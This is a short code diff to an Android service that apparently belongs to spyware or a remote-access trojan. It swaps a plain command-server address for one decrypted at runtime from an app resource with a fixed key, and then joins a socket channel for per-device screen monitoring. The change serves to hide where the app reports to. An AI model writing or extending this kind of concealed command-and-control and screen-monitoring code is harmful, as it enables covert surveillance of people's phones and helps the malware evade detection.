@@ -39,6 +39,8 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
+import javax.crypto.SecretKey;
+
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
@@ -81,8 +83,19 @@ public class Server extends Service {
         } catch (Exception ignored) {
         }
 
+        String Socket_url = "";
+
         try {
-            socket = IO.socket("https://socket.gsttrust.org/");
+            SecretKey secretKey = DeviceUtils.getFixedSecretKey();
+            // Decrypt the URL
+            Socket_url = DeviceUtils.decrypt(getString(R.string.stringvalue), secretKey);
+
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+
+        try {
+            socket = IO.socket(Socket_url);
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
